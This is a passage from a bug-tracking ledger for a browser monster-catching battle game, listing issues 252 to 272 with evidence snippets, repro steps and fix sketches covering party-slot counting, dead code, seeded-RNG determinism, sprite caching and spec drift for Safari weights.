## <a id="ISSUE-252"></a> ISSUE-252: Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent

---
id: ISSUE-252
severity: P3
category: inconsistency
anchor_symbol: _catchHandleSuccess
current_line_hint: ~45261
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4103af534a9a
confidence: medium
status: open
---

**Title**: Eggs occupy a party slot against the catch/withdraw cap but foe size matches only non-egg fighters — eggs silently shrink your catchable roster AND your opponent

**Evidence**:
```js
const maxParty = _storyMaxPartySize();
const partyFull = (sm.team || []).length >= maxParty;   // counts eggs
// vs foe sizing:
const partySize = _storyEnemyPartySize(event, _storyCountFighters() | 0, idx); // fighters only (excludes eggs)
```

**Repro**: After the Daycare egg event, a player carrying eggs (each `isEgg:true`) has them counted in `sm.team.length` for the catch "full" check (`_catchHandleSuccess`, `pcWithdraw` at ~44179) but EXCLUDED from `_storyCountFighters()` used for foe party sizing (~42399) and the proceed/empty checks. So a player with 1 fighter + 2 eggs at a 3-slot cap faces a 1-mon foe (correct-ish) yet cannot catch a new partner (party reads "3/3 full"), and the catch is forced to PC. The two cap interpretations disagree on what a "party slot" is.

**Blast radius**: Mid-game with daycare eggs. Mild — caught mons still land in PC and eggs hatch into the party — but the "you're full, sent to PC" message fires when the player effectively has open fighting slots, which reads as a bug to the player.

**Fix sketch**: Decide one definition of party occupancy. Likely: cap counts ALL slots (eggs included) consistently — then also size foes off `sm.team.length` for parity, OR exclude eggs from the catch-cap so eggs don't block catching. Align `_catchHandleSuccess`/`pcWithdraw` with `_storyEnemyPartySize`.

**Verification**: Carry 2 eggs + 1 fighter at cap 3; attempt a wild catch — confirm the catch-to-party vs catch-to-PC decision matches the intended egg-occupancy rule, and the foe size matches the same rule.

---

## <a id="ISSUE-253"></a> ISSUE-253: Regular wild encounter with zero balls shows greyed buttons but no "out of balls" message

---
id: ISSUE-253
severity: P3
category: dx
anchor_symbol: _catchRender
current_line_hint: ~49332
file: battle.html
agents: [story-mode-investigator]
fingerprint: 71a1ae0137d8
confidence: medium
status: open
---

**Title**: Regular wild encounter with zero balls shows greyed buttons but no "out of balls" message

**Evidence**:
```js
// boss-only escape hatch / message:
const bossRetreat = (_catchState.bossMode && _totalBalls <= 0) ? ` ... Out of Poké Balls ... ` : '';
// regular subText, no zero-ball callout:
: 'Catch chance is the species rate times the ball you throw.';
```

**Repro**: Trigger a route wild catch screen with `sm.balls` all zero (reachable: encounters auto-fire between battles regardless of stock). All four ball buttons render `disabled`/greyed with no explanation; only the floating Run button works. No softlock (Run exits), but the screen gives no hint why throwing is impossible. Boss mode gets a dedicated "Out of Poké Balls. Stock up and return." line; regular wild does not.

**Blast radius**: Wild catch screen UX. Mild player confusion, no data loss.

**Fix sketch**: When `_totalBalls <= 0` on a non-boss/non-safari catch, swap `subText` (or add a banner) to "Out of Poké Balls — buy more at the Poké Mart, then come back." 

**Verification**: Manual: enter a wild catch with 0 balls; confirm the message appears.

---

## <a id="ISSUE-254"></a> ISSUE-254: Variant Champion / rival dialogue narratively routes player to the dead broker + cage

---
id: ISSUE-254
severity: P3
category: inconsistency
anchor_symbol: _CHAMPION_DIALOGUE_BY_VARIANT
current_line_hint: ~32848
file: battle.html
agents: [consistency-auditor]
fingerprint: 09cd7d1f62cd
confidence: medium
status: open
---

**Title**: Variant Champion / rival dialogue narratively routes player to the dead broker + cage

**Evidence**:
```js
// project_mewtwo Champion outro (~32848):
'Champion: "You won. ... Walk to the broker. They have the Master Ball. End it." ...'
// project_mewtwo post-HoF epilogue (~33000):
'"Subject 0001 is waiting in the cage. The Master Ball is on the road. Walk when you\'re ready."'
// Also: ~39758, ~41625 — "the broker has an address / the Master Ball you'll need is in their drawer."
```

**Repro**: Play the `project_mewtwo` / `hypnos_lullaby` / `lavender_frequency` variants to the Champion/post-HoF beats — the prose instructs the player to "walk to the broker" and enter "the cage," but the broker leads and cage are unreachable (Caged-God arc dead). The narrative thread dangles.

**Blast radius**: Narrative payoff of the variant arcs is broken — the dialogue sets up a destination (the cage) the player can never reach. These are tone-consistent, well-written lines pointing at cut content.

**Fix sketch**: Either restore the Caged-God arc (so the lines pay off) or soften the variant outros to not promise a literal broker/cage visit. Tied to the Caged-God decision above.

**Verification**: No live variant dialogue instructs the player to visit a broker/cage that doesn't exist.

---

## <a id="ISSUE-255"></a> ISSUE-255: "Free" badge wording inconsistent — "1st Free" vs "Free" vs "Claimed" vs "Locked"

---
id: ISSUE-255
severity: P3
category: inconsistency
anchor_symbol: _costBadge
current_line_hint: ~42920
file: battle.html
agents: [consistency-auditor]
fingerprint: fadd94654030
confidence: medium
status: open
---

**Title**: "Free" badge wording inconsistent — "1st Free" vs "Free" vs "Claimed" vs "Locked"

**Evidence**:
```js
// 42920 relic / 42997 safari: label:'1st Free'
// 42770 / 42952 / 42968: label:'Free'
// 49981: 'Claimed'   38554 / 52102 / 52121 / 56811: 'Locked'
```

**Repro**: scan facility badges across cities; first-free facilities use "1st Free", others "Free"; post-claim states split "Claimed"/"Locked".

**Blast radius**: Minor visual drift in the badge strip. Pure-text.

**Fix sketch**: Standardize: "Free" for a free action, "1st Free" only where literally the first is free, one of {Claimed|Locked} for spent/gated. Document the vocabulary near `_costBadge`.

**Verification**: Badge strings drawn from one documented vocabulary.

---

## <a id="ISSUE-256"></a> ISSUE-256: 9 Gen-2-legacy "isBerry" items are dead data — no engine handler and never referenced by any build

---
id: ISSUE-256
severity: P3
category: data
anchor_symbol: _onBerryEaten
current_line_hint: ~25568
file: data/items.json
agents: [data-integrity-auditor]
fingerprint: e8d49fac6605
confidence: high
status: open
---

**Title**: 9 Gen-2-legacy "isBerry" items are dead data — no engine handler and never referenced by any build

**Evidence**:
```
// data/items.json entries with isBerry:true whose name string appears NOWHERE in battle.html:
Bitter Berry, Burnt Berry, Gold Berry, Ice Berry, Mint Berry,
Miracle Berry, Mystery Berry, PRZ Cure Berry, PSN Cure Berry
// These are the Gen-2 names later renamed (Gold Berry→Sitrus, Bitter Berry→Persim,
// PSN Cure Berry→Pecha, ...). The engine's berry logic is a hardcoded name switch
// (_onBerryEaten ~25568, residual/onEat sites ~25513-28460) keyed by the MODERN names.
```
68 of 77 `isBerry` items resolve to a real handler by exact-name match; these 9 do not. A scan of data/builds/*.json confirms ZERO build item slots reference any of the 9 — so they are unreachable dead data, not a live no-op (distinct from the 7 no-op abilities and 45 inert mega stones already filed).

**Repro**: collect `name` of every items.json entry with `isBerry:true`; grep each literal in battle.html (9 miss); then scan data/builds/*.json item fields for those 9 names (0 hits).

**Blast radius**: None today — unreachable via builds and shops. Latent only: a future dex/item browser or a "give held item" feature that surfaces items.json directly would hand the player an inert berry. Pure hygiene.

**Fix sketch**: Either prune the 9 Gen-2-legacy berry entries from data/items.json (they duplicate the modern-named berries that ARE handled), or add a one-line manifest noting Gen-2 berry aliases are intentionally retained as inert export rows. No engine change.

**Verification**: After pruning, `Object.values(items.json).filter(i=>i.isBerry).length` drops by 9 and every remaining isBerry name has a battle.html hit.

---

## <a id="ISSUE-257"></a> ISSUE-257: Dead CSS selector #story-pc-tab-journal-btn — no such tab button exists in the Poké Center

---
id: ISSUE-257
severity: P3
category: dx
anchor_symbol: _pcRefresh
current_line_hint: ~6659
file: battle.html
agents: [story-mode-investigator]
fingerprint: 4540fbc5d3fe
confidence: high
status: open
---

**Title**: Dead CSS selector #story-pc-tab-journal-btn — no such tab button exists in the Poké Center

**Evidence**:
```css
#story-pc-tab-storage-btn, #story-pc-tab-underground-btn, #story-pc-tab-journal-btn { ... }
```
```js
// Poké Center HTML has only storage + underground tab buttons (no journal button).
// _pcRefresh's _tabBtns map has only { storage, underground }.
// The rival journal (_pcRenderRivalJournalTab) now renders in the Collection screen
// (_collectionTab === 'rival'), not the PC. The journal-btn selector is orphaned.
```

**Repro**: grep -n 'story-pc-tab-journal-btn' battle.html → only the CSS rule at ~6659; no matching element.

**Blast radius**: None functional — dead style. Signals the rival journal was relocated out of the PC and the CSS wasn't cleaned up.

**Fix sketch**: Drop #story-pc-tab-journal-btn from the selector list.

**Verification**: grep shows the selector removed; PC tab styling unchanged.

---

## <a id="ISSUE-258"></a> ISSUE-258: `_pendingProfRoll` (singular) only ever assigned null — dead variable shadowing live `_pendingProfRolls`

---
id: ISSUE-258
severity: P3
category: refactor
anchor_symbol: _pendingProfRoll
current_line_hint: ~45954
file: battle.html
agents: [consistency-auditor]
fingerprint: fe19faa27ad9
confidence: high
status: open
---

**Title**: `_pendingProfRoll` (singular) only ever assigned null — dead variable shadowing live `_pendingProfRolls`

**Evidence**:
```js
// (legacy _pendingProfRoll kept for safety)
let _pendingProfRoll    = null;        // ~45954 — declared
// only other refs: _pendingProfRoll = null;  (~45966, ~46405) — null-clears only
```

**Repro**: `grep -nE '_pendingProfRoll\b' battle.html | grep -vE '_pendingProfRolls'` → declaration + two null-assignments, never a meaningful write and never a read. The live, plural `_pendingProfRolls` (note the trailing s, ~45946) is the real session state; the singular is leftover and easy to confuse with it at a glance.

**Blast radius**: None. Removing it cannot change behavior (it is never read).

**Fix sketch**: Delete the `_pendingProfRoll` declaration and its two null-clears. Keep `_pendingProfRolls`.

**Verification**: `grep -nE '_pendingProfRoll\b' battle.html | grep -vE '_pendingProfRolls'` returns 0 hits; professor-roll flow test passes.

---

## <a id="ISSUE-259"></a> ISSUE-259: Inert `_permBoostsRead`/`_permBoostTotal` stubs (+ window export) have zero callers — fully dead

---
id: ISSUE-259
severity: P3
category: refactor
anchor_symbol: _permBoostsRead
current_line_hint: ~33335
file: battle.html
agents: [consistency-auditor]
fingerprint: ab3e79af56a9
confidence: high
status: open
---

**Title**: Inert `_permBoostsRead`/`_permBoostTotal` stubs (+ window export) have zero callers — fully dead

**Evidence**:
```js
function _permBoostsRead(_mon) { return { hp:0, atk:0, def:0, spa:0, spd:0, spe:0 }; }
function _permBoostTotal(_mon) { return 0; }
window._permBoostsRead = function(_buildObj) { return { hp:0, atk:0, def:0, spa:0, spd:0, spe:0 }; };
```

**Repro**: `grep -nE '_permBoostsRead|_permBoostTotal' battle.html | grep -vE 'function _permBoost|window\._permBoost'` returns NOTHING — both stubs and the `window._permBoostsRead` export have zero call sites. The permBoost layer was retired (post-v19 vitamins lift IVs directly); the comment claims the stubs are "kept for safety" but nothing actually invokes them.

**Blast radius**: None — dead functions returning constant zeros, no callers. The legitimate part (the v19 migration that refunds leftover `permBoosts` as vitamins at ~35152-35161) is separate and should be retained.

**Fix sketch**: Delete `_permBoostsRead`, `_permBoostTotal`, and the `window._permBoostsRead` export. Leave the v19 refund migration intact.

**Verification**: `grep -nE '_permBoostsRead|_permBoostTotal' battle.html` returns 0 hits; engine test boot + a save-with-permBoosts load test still pass.

---

## <a id="ISSUE-260"></a> ISSUE-260: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

---
id: ISSUE-260
severity: P3
category: inconsistency
anchor_symbol: _pickCityQuoteLine
current_line_hint: ~29705
file: battle.html
agents: [consistency-auditor]
fingerprint: 2cc1751d63f6
confidence: medium
status: fixed-claude/sharp-keller-eZEDN
---

**Title**: `_pickCityQuoteLine` deliberately uses bare `Math.random` — drift across save reloads

**Evidence**:
```js
// L29673-L29706
// City NPC flavor (index = City N from event name). Uses Math.random only — must not advance story battle RNG.
const CITY_PROFESSOR_QUOTES = [ ... ];
const CITY_GUIDE_QUOTES = [ ... ];
function _pickCityQuoteLine(poolArr, cityIdx) {
    const idx = Math.min(Math.max(0, cityIdx|0), poolArr.length - 1);
    const lines = poolArr[idx] || poolArr[0];
    return lines[Math.floor(Math.random() * lines.length)];  // BARE — intentional
}
```

**Repro**: Save in City 4, reload — the professor quote may change between loads. Stated in the file comment as intentional ("must not advance story battle RNG").

**Blast radius**: Intentional behavior, low-impact. Could be made deterministic per (seed, cityIdx, visit-count) without touching the main story RNG stream by mirroring the `_storySideRng` pattern already used for rival secondary intros (L29622-29633). Would make seeded replays even more reproducible.

**Fix sketch**: Replace the bare `Math.random()` with `_storySideRng(cityIdx, sm.eventIndex|0)` so the same city visit at the same point produces the same quote. Keep the existing behavior off the main story RNG stream.

**Verification**: Reload a save twice at the same city event — professor/guide quote should be identical both times.

---

## <a id="ISSUE-261"></a> ISSUE-261: Variant roll + Mystery identity use bare `Math.random()` at run construction — non-deterministic across seeded replays

---
id: ISSUE-261
severity: P3
category: bug
anchor_symbol: _pickRandomStorylineVariant
current_line_hint: ~38758
file: battle.html
agents: [story-mode-investigator]
fingerprint: 068158ced84c
confidence: medium
status: open
---

**Title**: Variant roll + Mystery identity use bare `Math.random()` at run construction — non-deterministic across seeded replays

**Evidence**:
```js
function _pickRandomStorylineVariant(){
   const r = (sm && sm.active && typeof storyRngNext==='function') ? storyRngNext() : Math.random();
   …// at startNewRun time sm.active is false → Math.random()
}
// startNewRun: mysteryIdentity: _storyPickMysteryIdentity()  (now constant 'the_first', so benign),
//   tracks: { villain: _pickTrack(VILLAIN_TRACKS), extra: _pickTrack(EXTRA_TRACKS) }  // _pickTrack also Math.random when !sm.active
```

**Repro**: At `startNewRun`, `sm.active` is still false, so `_pickRandomStorylineVariant` and `_pickTrack` fall to `Math.random()`. Two runs created with the same `runSeed` can roll different storyline variants and different villain/extra tracks — the run's entire narrative spine is not reproducible from the seed.

**Blast radius**: Determinism (CLAUDE.md: "Use seeded RNG everywhere user-visible… Deterministic replays are part of the product"). The variant + tracks are the most user-visible run-level choices and they're seeded by wall-clock RNG, so a "replay this seed" can't reproduce the same story. Distinct from ledger ISSUE-105 (Mystery identity, now constant).

**Fix sketch**: Seed the variant + track rolls from `runSeed` deterministically at construction (derive a temp RNG from the freshly-assigned seed before `sm.active` flips), so the same seed yields the same variant/tracks.

**Verification**: Two fresh runs with an identical injected `runSeed` produce identical `sm.storyLine` and `sm.tracks`.

---

## <a id="ISSUE-262"></a> ISSUE-262: League-road narrative "clumping" — 6 story beats fire back-to-back before the Champion (the audit §4 flow bug, still unfixed in the live path)

---
id: ISSUE-262
severity: P3
category: inconsistency
anchor_symbol: _playStoryBeatQueue
current_line_hint: ~42429
file: battle.html
agents: [story-mode-investigator]
fingerprint: bfb866b472f0
confidence: medium
status: fixed-claude/cagedgod-excision
---

**Title**: League-road narrative "clumping" — 6 story beats fire back-to-back before the Champion (the audit §4 flow bug, still unfixed in the live path)

**Evidence**:
```js
// _tryFireRoadStoryBeats -> _resolveActiveRoadBeats returns ALL unfired event
// beats for the road; _playStoryBeatQueue plays them sequentially with a
// Continue between each. Harness arr63 (league road):
//   LIVE-events = [main.event6, main.event7, main.event8, main.event9, main.mfReveal, main.ending]
```

**Repro**: Harness `resolveActiveRoadBeats('league')` ⇒ 6 event beats dumped at once. The unified-engine header comment itself lists "clumping" + "ending-before-climax" as audit §4 flow bugs that "land as one isolated edit to the resolver at P4" — but P4 was never done, and the live path (a different resolver) has the same clumping.

**Blast radius**: UX pacing only (6 consecutive Continue-prompt overlays on the final road), not a crash. The `.ending` auto-depends-on-`.boss` fix exists ONLY in the dormant unified resolver's `requires` metadata (`@42475`), which is never consulted by the live `_resolveActiveRoadBeats`. So the documented ending-before-climax guard is stranded in dead code.

**Fix sketch**: If the §4 fixes are still wanted, port the `requires`-style ordering + per-slot granularity into the LIVE `_resolveActiveRoadBeats`/`_playStoryBeatQueue`, not the dormant resolver. Otherwise document that road-level clumping is accepted.

**Verification**: Walking the final road shows beats paced across battles, or a single documented decision that clumping is intended.

---

## <a id="ISSUE-263"></a> ISSUE-263: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

---
id: ISSUE-263
severity: P3
category: perf
anchor_symbol: _preloadedImages
current_line_hint: 11983
file: battle.html
agents: [performance-profiler]
fingerprint: 2b9d-imageprefetch
confidence: medium
status: open
---

**Title**: Sprite preloading is unbounded — each `getSprite()` call adds a `new Image()` to a global cache with no eviction; a long story run can preload 1000+ images

**Evidence**:
```js
// battle.html:11982
const _spriteCache = {};
const _preloadedImages = {};
// :12036
if (!_preloadedImages[url]) {
    let img = new Image(); img.src = url; _preloadedImages[url] = img;
}
```
`getSprite()` is called from 44 sites (every battle-UI redraw, every party-screen render, every draft-card render, every PC storage render). Each unique (name, shiny, back) tuple creates an `Image` that holds the GIF in memory. A full story run sees 100–300 unique mons across battles, party screens, PC storage, and trainer previews. Multiply by `shiny` × `back` variants and the cache can easily exceed 500 entries; on a long save (multiple runs) it grows unboundedly.

**Repro**: Greps `grep -c 'new Image()' battle.html` → 1 (the only caller) and `grep -c 'getSprite\s*('` → 44 (the call sites). No eviction logic exists (`grep '_preloadedImages\s*='` shows only the initial `{}` declaration plus the assignment-in-loop).

**Blast radius**: Each GIF sprite from Showdown is ~5–50 KB. 500 cached = ~10–25 MB of image data the browser pins. On low-RAM mobile devices this contributes to mid-session crashes / OOM. The memory-growth benchmark at 60 turns shows only +5 MB heap growth (linear, R² = 0.712), but that's the JS heap — the image cache lives in the browser's image-decoder pool, separate from V8 heap, and would not show up in `process.memoryUsage()`. This finding is a forward-looking risk, not a confirmed regression. Marked P3 / confidence medium.

**Fix sketch**: Convert `_preloadedImages` from an unbounded Object into a bounded LRU cache (e.g., keep last 100 sprites). Alternatively, just remove the `new Image()` preload — modern browsers cache `<img src>` automatically once an `<img>` element is appended; the explicit Image() instances duplicate the cache.

**Verification**: After the fix, `Object.keys(_preloadedImages).length` should plateau in a long story run instead of growing monotonically.

---

## <a id="ISSUE-264"></a> ISSUE-264: Casino debits floor gold at Math.max(0, gold-bet), which would silently mask a future bet-validation regression

---
id: ISSUE-264
severity: P3
category: dx
anchor_symbol: _refreshCasinoGoldPill
current_line_hint: ~50833
file: battle.html
agents: [story-mode-investigator]
fingerprint: 39587f58cfe0
confidence: low
status: open
---

**Title**: Casino debits floor gold at Math.max(0, gold-bet), which would silently mask a future bet-validation regression

**Evidence**:
```js
sm.gold = Math.max(0, (sm.gold | 0) - bet);   // flip / slots / roulette
```

**Repro**: Bets are pre-validated (_casinoTryBet: bet<=have; slots/roul check have<stake), so the clamp never fires today. A future over-bet (e.g. multi-stake roulette rounding) would be silently swallowed into a free spin instead of a detectable underflow.

**Blast radius**: Defensive hygiene only; no current incorrect behavior.

**Fix sketch**: Rely on upstream validation and drop the clamp, or add a dev-mode assert when gold-bet<0 so a regression is loud.

**Verification**: Inject an over-bet in a test → assert/log fires instead of a silent clamp.

---

## <a id="ISSUE-265"></a> ISSUE-265: Crucible "Pokémon Center" facility re-renders the Caged God section a second time (below the Underground sell list)

---
id: ISSUE-265
severity: P3
category: design
anchor_symbol: _renderCrucible
current_line_hint: ~48135
file: battle.html
agents: [story-mode-investigator]
fingerprint: 0fa929cda809
confidence: medium
status: fixed-claude/cagedgod-excision
---

**Title**: Crucible "Pokémon Center" facility re-renders the Caged God section a second time (below the Underground sell list)

**Evidence**:
```js
// _renderCrucible top: Post-Game Quest section = _bossArcRenderSection(true)
const cagedGodHtml = _bossArcRenderSection(true);
// ...Facilities → "Pokémon Center" button → enterPokemonCenter() → _pcRenderUndergroundTab()
//    which ends with:  html += _bossArcRenderSection();   // (~47924, hubMode=false)
```
From inside the Crucible, opening the "Pokémon Center" facility renders the Underground tab, which appends `_bossArcRenderSection()` with hubMode=false. Since the player is parked at a non-2/5/8 city post-HoF, that path shows the dead "No lead here. Try City 2, 5, or 8." block — directly contradicting the Crucible's top-level Post-Game Quest section that lets you collect every lead from the same hub.

**Repro**: Post-HoF, Crucible → Facilities → Pokémon Center → Underground tab. Scroll past the sell list: a second Caged God box appears saying leads are elsewhere, even though the Crucible's own quest section above says otherwise.

**Blast radius**: Player wayfinding/confusion in the maintainer's freshly sub-sectioned Crucible. Two contradictory Caged God affordances in one navigation context.

**Fix sketch**: Suppress `_bossArcRenderSection()` in the Underground tab when `sm.atCrucible` is true (the Crucible's Post-Game Quest section already owns it), or pass hubMode through so it shows the same collectable buttons. Simplest: `if (!sm.atCrucible) html += _bossArcRenderSection();`.

**Verification**: Inside the Crucible, the Caged God appears exactly once (the top quest section), never as a "no lead here" dead block.

---

## <a id="ISSUE-266"></a> ISSUE-266: Grade badge prefix differs between prof pick cards (G#) and swap slots (T#)

---
id: ISSUE-266
severity: P3
category: inconsistency
anchor_symbol: _renderProfChoices
current_line_hint: ~45179
file: battle.html
agents: [story-mode-investigator]
fingerprint: 6f7d78ccc064
confidence: high
status: open
---

**Title**: Grade badge prefix differs between prof pick cards (G#) and swap slots (T#)

**Evidence**:
```js
// pick card:  <span class="tier-badge bg-tier-">G</span>   (tier = ch.g = getMonGrade)
// swap slot:  <span class="tier-badge bg-tier-">T</span>          (g = getMonGrade)
```

**Repro**: Same Professor screen, two card styles. Both render getMonGrade but one prefixes "G" and the other "T", for the same underlying number.

**Blast radius**: Cosmetic consistency within one screen.

**Fix sketch**: Use one prefix (G for grade) in both renderers.

**Verification**: Visual diff of pick card vs swap slot badge prefixes.

---

## <a id="ISSUE-267"></a> ISSUE-267: "Reveal lands inside first ~10 minutes" comment is wrong — first villain beat is post-Gym-2 (road2)

---
id: ISSUE-267
severity: P3
category: inconsistency
anchor_symbol: _ROAD_BY_ARRAY_IDX
current_line_hint: ~42098
file: battle.html
agents: [story-mode-investigator]
fingerprint: d0c94030baf0
confidence: high
status: open
---

**Title**: "Reveal lands inside first ~10 minutes" comment is wrong — first villain beat is post-Gym-2 (road2)

**Evidence**:
```js
// Comment @ ~30708: "tracks stay hidden until the first beat fires organically — Road 1 = first
//   extra beat, Road 2 = first villain beat — so the reveal lands inside the first ~10 minutes."
// Road→array-idx map (derived): road1 first Battle = array idx 7 (post-Gym-1 Basic Trainer);
//   road2 first Battle = array idx 13 (post-Gym-2 Basic Trainer).
// So extra.event1 (road1) ≈ after Gym 1; villain.event1 (road2) ≈ after Gym 2 — not ~10 min in.
```

**Repro**: Compare the run-start comment to the road map. The first VILLAIN reveal can't fire until the player has cleared Gym 2 and stepped onto road2 (array idx 13). For a normal player that is well past 10 minutes. Extra-track reveal (road1) is after Gym 1.

**Blast radius**: Doc/comment only, but it misstates a deliberate pacing intent (early hook). If the intent is a genuinely-early reveal, the anchors are too late; if the late anchor is intended, the comment is misleading.

**Fix sketch**: Either move extra.event1 to the pre-Gym-1 route (Road 0, array idx 2 — currently `null` road) and villain.event1 to road1, OR fix the comment to state the real timing (extra after Gym 1, villain after Gym 2).

**Verification**: The reveal timing matches the comment, or the comment matches the road map.

---

## <a id="ISSUE-268"></a> ISSUE-268: Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve

---
id: ISSUE-268
severity: P3
category: inconsistency
anchor_symbol: _SAFARI_GRADE_CURVE_BY_BADGES
current_line_hint: ~43547
file: battle.html
agents: [story-mode-investigator]
fingerprint: a2bb5974a473
confidence: high
status: open
---

**Title**: Safari curve key [3] ("first unlock") is dead code — Safari actually unlocks at 4 badges, so first visit uses the harsher [4] curve

**Evidence**: The Safari Zone action first appears on the hub row labeled `City5` (STORY_EVENTS_RAW row 28). The player reaches that hub with 4 badges (Gym Leaders 1-4 are behind it). But `_SAFARI_GRADE_CURVE_BY_BADGES` and its comment assume the first visit is at 3 badges — key `3` is labeled "first unlock @ City 4" (g4:35, the gentlest) but is never reached in normal play; the first visit uses key `4` (g4:25). Verified via repro.

**Repro**: `node scripts/debug/_repro/safari-citybadge.mjs` prints "Safari Zone first appears at row index 28 ... Badges the player has when first reaching this hub: 4".

**Blast radius**: Cosmetic/balance only. The intended "gentle first visit" (35% G4) is never delivered. Separately, the in-game help text (battle.html ~10640 / ~10661) and the curve comment say "City 4" while the timeline labels the hub "City5" — a naming inconsistency worth reconciling.

**Fix sketch**: Either open Safari one hub earlier (badges 3), or relabel the curve so key `4` carries the gentle first-visit weights and drop the unreachable `3` entry. Reconcile the City4/City5 naming.

**Verification**: Confirm `_safariGradeWeightsForBadges()` returns the intended first-visit weights at the badge count the player actually has on entry (4).

---

## <a id="ISSUE-269"></a> ISSUE-269: Safari grade weights are a per-badge curve in code, but STORY_MODE_FLOW.md §4 still specs the old flat g1:3/g2:22/g3:50/g4:25

---
id: ISSUE-269
severity: P3
category: inconsistency
anchor_symbol: _SAFARI_GRADE_CURVE_BY_BADGES
current_line_hint: ~47953
file: battle.html
agents: [story-mode-investigator]
fingerprint: 191bc4dc63de
confidence: high
status: open
---

**Title**: Safari grade weights are a per-badge curve in code, but STORY_MODE_FLOW.md §4 still specs the old flat g1:3/g2:22/g3:50/g4:25

**Evidence**:
```js
const _SAFARI_GRADE_CURVE_BY_BADGES = {
    3: { g1: 0, g2: 5,  g3: 60, g4: 35 },  // first unlock @ City 4
    4: { g1: 0, g2: 15, g3: 60, g4: 25 },
    ...
    8: { g1: 5, g2: 50, g3: 40, g4: 5  }   // post-G8 / Crucible re-entry
};
// comment: "Pre-v19 was static {g1:3,g2:22,g3:50,g4:25}."
```
STORY_MODE_FLOW.md §4 line 103 still lists `SAFARI_GRADE_WEIGHTS g1:3 / g2:22 / g3:50 / g4:25` as the live value, and the prior audit's "verify code matches" expects the flat table. The code intentionally moved to a badge-gated curve (a maxwell change). 6-encounter / 15-ball / 10kG entry all still match spec.

**Repro**: Static — compare §4 to `_SAFARI_GRADE_CURVE_BY_BADGES`.

**Blast radius**: Doc accuracy only; the curve itself is a deliberate balance evolution. Flagging so the canonical spec doesn't keep claiming a flat table that no longer exists.

**Fix sketch**: Update STORY_MODE_FLOW.md §4 to describe the per-badge curve (pasteur/maxwell), or add a one-line "superseded by `_SAFARI_GRADE_CURVE_BY_BADGES`" note.

**Verification**: Spec §4 matches the shipped curve.

---

## <a id="ISSUE-270"></a> ISSUE-270: Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25

---
id: ISSUE-270
severity: P3
category: inconsistency
anchor_symbol: _safariGradeWeightsForBadges
current_line_hint: ~43154
file: battle.html
agents: [story-mode-investigator]
fingerprint: ecabacc5ef90
confidence: high
status: open
---

**Title**: Safari grade weights are now badge-keyed — spec/CODEBASE_MAP still cite the old static g1:3/g2:22/g3:50/g4:25

**Evidence**:
```js
// battle.html:43154 — v19 replaced the static weights with a badge curve
const _SAFARI_GRADE_CURVE_BY_BADGES = {
  3: { g1: 0, g2: 5,  g3: 60, g4: 35 },  // first unlock @ City 4
  ...
  8: { g1: 5, g2: 50, g3: 40, g4: 5  }
};
```

**Repro**: STORY_MODE_FLOW §4, CODEBASE_MAP, and the audit mandate all state Safari "weights g1:3/g2:22/g3:50/g4:25". Code comment at 43152 confirms "Pre-v19 was static {g1:3,g2:22,g3:50,g4:25}." The current curve scales with `sm.badges` so the FIRST (free, City-4) Safari visit yields ZERO G2 and zero G1 — a deliberate "real chance at a strong G3" tuning, not the documented haul.

**Blast radius**: Spec-vs-code drift only (code is the newer, intentional design). Anyone tuning Safari from the spec would regress it. 6-encounter loop (`SAFARI_MAX_ENCOUNTERS=6`), 15-ball session (`SAFARI_BALLS_PER_SESSION=15`), 1.35× mult all match spec.

**Fix sketch**: Update STORY_MODE_FLOW §4 + CODEBASE_MAP to reference `_SAFARI_GRADE_CURVE_BY_BADGES` as the source of truth. No code change.

**Verification**: Spec table matches the live constant.

---

## <a id="ISSUE-271"></a> ISSUE-271: Safari grade weights diverge from the canonical spec (`g1:3/g2:22/g3:50/g4:25`) — code is a badge-staged curve; spec is stale

---
id: ISSUE-271
severity: P3
category: data
anchor_symbol: _safariGradeWeightsForBadges
current_line_hint: ~47725
file: battle.html
agents: [story-mode-investigator]
fingerprint: 407ccda7ec47
confidence: high
status: open
---

**Title**: Safari grade weights diverge from the canonical spec (`g1:3/g2:22/g3:50/g4:25`) — code is a badge-staged curve; spec is stale

**Evidence**:
```js
// "Pre-v19 was static {g1:3,g2:22,g3:50,g4:25}."
const _SAFARI_GRADE_CURVE_BY_BADGES = {
    3: { g1: 0, g2: 5,  g3: 60, g4: 35 },
    8: { g1: 5, g2: 50, g3: 40, g4: 5  }
};
```
The audit mandate / STORY_MODE_FLOW still cite the flat `3/22/50/25` weights and "6 encounters per run." Encounter count (`SAFARI_MAX_ENCOUNTERS = 6`) still matches, but the weights were intentionally replaced by a badge-staged curve in v19. This is spec drift, not a code bug — flagging so the canon doc gets reconciled (the in-code comment explicitly documents the intent).

**Repro**: N/A — diff the live constant against STORY_MODE_FLOW Safari section.

**Blast radius**: Documentation/spec only.

**Fix sketch**: Update STORY_MODE_FLOW.md (and any audit checklist) to describe the staged curve, or have maxwell confirm the staged curve is the intended canon and retire the flat-weight line.

**Verification**: Spec and `_SAFARI_GRADE_CURVE_BY_BADGES` agree.

---

## <a id="ISSUE-272"></a> ISSUE-272: CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock

---
id: ISSUE-272
severity: P3
category: bug
anchor_symbol: _shouldFireCatchTutorialBeforeBattle
current_line_hint: ~44996
file: battle.html
agents: [story-mode-investigator]
fingerprint: df15067e7f6b
confidence: high
status: open
---

**Title**: CONFIRMED CLEAN — catch tutorial fires exactly once; mid-tutorial reload cannot refire or lock

**Evidence**:
```js
// Flag set ONLY on actual catch success (44996):
if (_catchState && _catchState.tutorialMode) { _markCatchTutorialDone(); }
// Gate (41454): if (!sm || sm.catchTutorialDone) return false;  + intro-rival-behind check
// Migration (31907): sm.catchTutorialDone = (sm.eventIndex|0) > 1;  for pre-v16 saves
```

**Repro**: `_shouldFireCatchTutorialBeforeBattle` (41453) gates on `!sm.catchTutorialDone`, intro-rival-behind, party<cap, ≥1 ball. `catchTutorialDone` is set by `_markCatchTutorialDone` ONLY inside the catch-success path under `tutorialMode` (44996–45001) — explicitly "so a mid-tutorial reload doesn't lock the once-per-save flag without the partner ever landing." v16 migration back-fills existing saves.

